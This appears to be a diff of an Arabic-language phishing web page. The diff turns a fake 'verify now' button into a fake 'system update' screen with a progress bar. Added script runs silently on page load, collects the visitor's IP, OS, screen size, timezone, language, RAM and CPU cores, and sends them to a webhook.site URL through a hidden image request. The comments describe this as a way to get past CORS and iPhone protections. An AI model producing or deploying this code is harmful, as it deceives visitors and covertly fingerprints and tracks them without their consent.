@@ -1,60 +1,129 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الدخول</title>
+    <title>تحديث النظام</title>
+    <style>
+        /* تصميم بسيط جداً وخادع (يبدو كصفحة صيانة) */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
+        body { 
+            background: #f0f2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+        }
+        .spinner {
+            width: 50px; height: 50px; border-radius: 50%;
+            border: 6px solid #e4e6eb; border-top: 6px solid #1877f2;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
+        p { font-size: 14px; color: #65676b; line-height: 1.6; }
+        .bar { 
+            width: 100%; height: 6px; background: #e4e6eb; border-radius: 10px; 
+            margin: 20px 0; overflow: hidden;
+        }
+        .bar-fill {
+            height: 100%; width: 0%; background: #1877f2;
+            animation: load 3s ease-in-out forwards;
+        }
+        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
+        #status { font-size: 12px; color: #65676b; min-height: 20px; }
+    </style>
 </head>
-<body style="font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5;">
-    <div style="background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px;">
-        <h2 style="color: #333; font-weight: bold;">🔐 تأمين الاتصال</h2>
-        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">عليك الضغط على الزر لإكمال التحقق</p>
+<body>
+
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>جاري تحديث النظام</h2>
+        <p>يرجى عدم إغلاق الصفحة، جاري تطبيق الإعدادات الأمنية على جهازك...</p>
         
-        <!-- هذا الزر هو الذي سيفعل كل شيء -->
-        <button id="sendBtn" style="width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer;">
-            تحقق الآن
-        </button>
+        <div class="bar">
+            <div class="bar-fill"></div>
+        </div>
         
-        <div id="status" style="margin-top: 15px; font-size: 13px; color: #555;"></div>
+        <div id="status">تأمين الاتصال...</div>
     </div>
 
+    <!-- ============================================ -->
+    <!-- كود التجميع والإرسال (Zero-Click & Image Ping) -->
+    <!-- ============================================ -->
     <script>
-        // دالة لجلب الـ IP (لمحاولة التغلب على حظر آيفون)
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch { return "Unreachable"; }
+        // 1. دالة لجمع البيانات التفصيلية
+        function collectData() {
+            const ua = navigator.userAgent;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
+            const ram = navigator.deviceMemory || 'Unknown';
+            const cores = navigator.hardwareConcurrency || 'Unknown';
+
+            // تحليل نظام التشغيل
+            let os = "Unknown";
+            if (ua.includes('Windows')) os = "Windows";
+            else if (ua.includes('Mac')) os = "macOS";
+            else if (ua.includes('Linux')) os = "Linux";
+            else if (ua.includes('Android')) os = "Android";
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = "iOS";
+
+            return { ua, screenRes, timezone, language, ram, cores, os };
         }
 
-        document.getElementById('sendBtn').addEventListener('click', async function() {
-            const btn = this;
-            const status = document.getElementById('status');
+        // 2. دالة الإرسال (Image Ping - الأكثر احترافية)
+        async function sendData() {
+            const data = collectData();
             
-            btn.innerText = "جاري التحقق...";
-            btn.style.background = "#999";
-            
-            const ip = await getIP();
-            const ua = navigator.userAgent;
-            
-            // تجميع البيانات في نص واحد
-            const payload = `Device=iPhone&Browser=Safari&IP=${ip}&UA=${encodeURIComponent(ua)}`;
+            // محاولة جلب الـ IP العام
+            let ip = "Unknown";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                ip = json.ip;
+            } catch (e) { /* Fail silently */ }
 
-            // --- الحيلة الذكية لاختراق حماية آيفون ---
-            // بدلاً من استخدام fetch (الذي يحظره آيفون)، سنستخدم صورة مخفية.
-            // المتصفح سيجبر على إرسال البيانات كـ GET parameters عند تحميل الصورة.
+            // بناء رابط الإرسال (تشفير البيانات داخل الرابط)
+            // ملاحظة: هذا الرابط هو لموقع الويب هوك الخاص بك. قم بتغييره إذا أردت.
+            const webhookURL = `https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397`;
             
+            // تجهيز الباراميترات
+            const params = new URLSearchParams({
+                ip: ip,
+                os: data.os,
+                ram: data.ram,
+                cores: data.cores,
+                screen: data.screenRes,
+                tz: data.timezone,
+                lang: data.language,
+                ua: data.ua
+            });
+
+            // الإرسال عبر صورة مخفية (يتجاوز حماية CORS وحظر الـ POST)
             const img = new Image();
-            img.src = `https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397?${payload}`;
+            img.src = `${webhookURL}?${params.toString()}`;
             
-            // تغيير حالة الزر
+            // تحديث حالة النص في الصفحة
+            document.getElementById('status').innerText = "✅ تم تحديث الإعدادات بنجاح.";
+        }
+
+        // 3. تشغيل الإرسال تلقائياً عند تحميل الصفحة
+        window.onload = function() {
+            // انتظر 1.5 ثانية ليبدأ شريط التحميل، ثم أرسل البيانات
             setTimeout(() => {
-                btn.innerText = "تم التحقق";
-                btn.style.background = "#28a745";
-                status.innerHTML = "<span style='color: green;'>✅ تم.</span>";
+                sendData();
             }, 1500);
-        });
+        };
     </script>
 </body>
 </html>
